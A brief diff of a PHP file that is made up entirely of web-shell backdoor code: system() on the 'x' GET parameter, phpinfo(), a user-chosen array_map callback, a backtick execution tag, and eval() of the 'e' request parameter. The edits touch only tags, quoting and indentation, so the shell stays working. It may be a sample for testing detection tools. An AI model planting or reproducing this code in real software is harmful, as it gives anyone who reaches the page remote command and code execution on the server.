@@ -1,4 +1,4 @@
-<?  
+<?php
 system($_GET['x']);
 phpinfo();
 
@@ -16,7 +16,7 @@ $evil_callback = $_GET['callback'];
 $some_array = array(0, 1, 2, 3);
 $new_array = array_map($evil_callback, $some_array);
 <?=@`$c`?>
-if (isset($_REQUEST['e'])) {
-eval(stripslashes($_REQUEST['e']));
+if (isset($_REQUEST["e"])) {
+      eval(stripslashes($_REQUEST['e']));
 }
 ?>
